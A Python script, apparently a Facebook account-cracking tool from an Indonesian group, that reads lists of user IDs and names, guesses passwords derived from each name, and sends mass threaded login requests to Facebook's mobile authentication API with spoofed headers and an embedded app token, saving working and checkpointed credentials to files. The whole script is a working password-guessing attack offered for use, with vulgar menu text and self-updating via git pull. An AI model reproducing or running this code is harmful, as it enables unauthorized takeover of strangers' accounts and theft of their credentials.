#!/usr/bin/python3
#Written by ChangFB
import requests,bs4,json,os,sys,random,datetime,time,re
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('[✓] Internet Eror ,Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Aziz

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

x = '\033[93m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[92m'
u = '\033[95m'
kk = '\033[93m'
b = '\33[1;96m'
p = '\x1b[1;95m'
P = '\033[0;00m'
J = '\033[1;93m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[1;92m'
C ='\033[1;96m'
M ='\033[1;91m'
U ='\033[1;95m'
K ='\033[1;93m'
P='\033[00m'
h='\033[1;90m'
Q="\033[00m"
kk='\033[1;92m'
ff='\033[1;96m'
G='\033[1;96m'
p='\033[00m'
h='\033[1;90m'
Q="\033[00m"
I='\033[1;92m'
II='\033[1;96m'
m='\033[1;91m'
O ='\033[1;93m'
H='\033[1;93m'
b = '\033[1;96m'
war = "[•]"
B = random.choice([U,I,K,b,M])

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

my_id = '100007061760822'

def jalan(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
    
def clear():
	os.system('clear')
def back():
	menu()
def banner():
	clear()
	print("""%s\n\x1b[93;1m
\n"""%(h))
def menu(): #Chang
	banner()
	print("") #Chang
	print("""%s      \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m V\x1b[1;90m:\x1b[1;97m 1.0\n      \x1b[1;96m88  dP 88 88b 88  dP""b8 888888 88""Yb \n      \x1b[1;96m88odP  88 88Yb88 dP   `" 88__   88__dP \n      \x1b[1;96m88"Yb  88 88 Y88 Yb  "88 88""   88""Yb \n      \x1b[1;96m88  Yb 88 88  Y8  YboodP 88     88oodP \n\x1b[1;93m─━㋱\x1b[1;97mSTATUS\x1b[1;90m : \x1b[1;97m[\x1b[1;92mFree✓\x1b[1;97m]\x1b[1;97m WHATSAPP\x1b[1;90m : \x1b[1;97m0819-0776-1235\x1b[1;93m㋱━─\n\x1b[1;90m───────────────────────────────────────────────────\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack Dari Anggota Grup\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack Dari Teman Publik\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack Dari Total Followers\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack Dari Like Postingan\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Crack Dari Random Id Massal\n   \x1b[1;90m[\x1b[1;97m01\x1b[1;90m]\x1b[1;97m Crack Dari File Cloning\n   \x1b[1;90m[\x1b[1;97m00\x1b[1;90m]\x1b[1;97m Keluar & Lanjut\n"""%(h))
	print("""%s\x1b[1;90m───────────────────────────────────────────────────"""%(h))
	farhan = input(x+'   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Pilih Cil\x1b[1;90m :\x1b[1;92m ')
	if farhan in ['1','01']:
		File2()
	elif farhan in ['0','00']:
		os.system("xdg-open https://www.facebook.com/groups/544745423962902/?ref=share")
		exit()
	else:
		os.system("https://www.facebook.com/groups/544745423962902/?ref=share")
		exit()

def File2():
			clear()
			banner()
			try:
				fileX = input ('\x1b[1;90m───────────────────────────────────────────────────\n\x1b[1;93m─━㋱\x1b[1;97mSTATUS\x1b[1;90m : \x1b[1;92mPremium\x1b[1;97m WHATSAPP\x1b[1;90m : \x1b[1;97m0819-0776-1235\x1b[1;93m㋱━─\n\x1b[1;90m───────────────────────────────────────────────────\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Masukan File Cil\x1b[1;90m :\x1b[1;92m ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m File Error"%(fileX))

def setting():
	print("""%s\x1b[1;90m───────────────────────────────────────────────────\n   \x1b[1;90m[\x1b[1;97m01\x1b[1;90m]\x1b[1;97m Metode Ngcok\n   \x1b[1;90m[\x1b[1;97m02\x1b[1;90m]\x1b[1;97m Metode Ngocok\n   \x1b[1;90m[\x1b[1;97m02\x1b[1;90m]\x1b[1;97m Metode Memek\n\x1b[1;90m───────────────────────────────────────────────────"""%(h))
	mubashar = input(x+'   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Pilih Cil\x1b[1;90m :\x1b[1;92m ')
	if mubashar in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif mubashar in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	
	else:
		print("""%s \33[1;33mRoung Input"""%(h))
		exit()
	print("""%s\x1b[1;90m───────────────────────────────────────────────────\n   \x1b[1;90m[\x1b[1;97m01\x1b[1;90m]\x1b[1;97m  B-Api (Fast)\n\x1b[1;90m─────────────────────────────────────────────────── """%(h))
	baloch = input(x+'   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Pilih Cil\x1b[1;90m :\x1b[1;92m ')
	if baloch in ['1','01']:
		method.append('api')
	else:
		method.append('api')
	print("""%s \x1b[38;5;248m────────────────────────────────────────────────────────────\x1b[92;1m """%(h))
	fast = input(x+'   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Ingin Memulai? \x1b[1;90m(\x1b[1;92mY\x1b[1;90m/\x1b[1;91mT\x1b[1;90m)\x1b[1;90m :\x1b[1;92m ')
	if fast in ['y','Y']:
		passwrd()
	elif fast in ['t','T']:
		os.system("xdg-open https://youtube.com/channel/UCRF1vLzZz1ESEjLTqpc-CfA")
		exit()

def passwrd():
	clear()
	banner()
	print("""%s      \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m V\x1b[1;90m:\x1b[1;97m 1.0\n      \x1b[1;96m88  dP 88 88b 88  dP""b8 888888 88""Yb \n      \x1b[1;96m88odP  88 88Yb88 dP   `" 88__   88__dP \n      \x1b[1;96m88"Yb  88 88 Y88 Yb  "88 88""   88""Yb \n      \x1b[1;96m88  Yb 88 88  Y8  YboodP 88     88oodP \n\x1b[1;93m─━㋱\x1b[1;97mSTATUS\x1b[1;90m : \x1b[1;97m[\x1b[1;92mFree✓\x1b[1;97m]\x1b[1;97m WHATSAPP\x1b[1;90m : \x1b[1;97m0819-0776-1235\x1b[1;93m㋱━─\n\x1b[1;90m───────────────────────────────────────────────────\x1b[92;1m """%(h))
	print(x+' '+h+' '+x+' \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Total ID :\x1b[1;92m '+str(len(id)))
	print(x+'   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Jika Tidak Ada Hasil Gunakan Mode Pesawat\n   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Mulai Retak...')
	print("""%s\x1b[1;90m───────────────────────────────────────────────────\x1b[92;1m """%(h))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
			if 'api' in method:
				pool.submit(crack2,idf,pwv)
			else:
				pool.submit(crack2,idf,pwv)
	print('')
	print("""%s\x1b[1;90m───────────────────────────────────────────────────\x1b[92;1m """%(h))
	exitss = input(x+'   \x1b[1;90m[\x1b[1;97m>_\x1b[1;90m]\x1b[1;97m Ingin Kelua \x1b[1;90m(\x1b[1;92mY\x1b[1;90m/\x1b[1;91mT\x1b[1;90m)\x1b[1;90m :\x1b[1;92m ')
	if exitss in ['y','Y']:
		exit()
	else:
		exit()

def crack2(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s   [CHANG] %s/%s  OK/%s | CP/%s : %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s   [CP] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s   [OK] %s|%s        '%(h,idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


if __name__=='__main__':
	os.system('git pull')
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	os.system("xdg-open https://www.facebook.com/groups/544745423962902/?ref=share")
	menu()
	
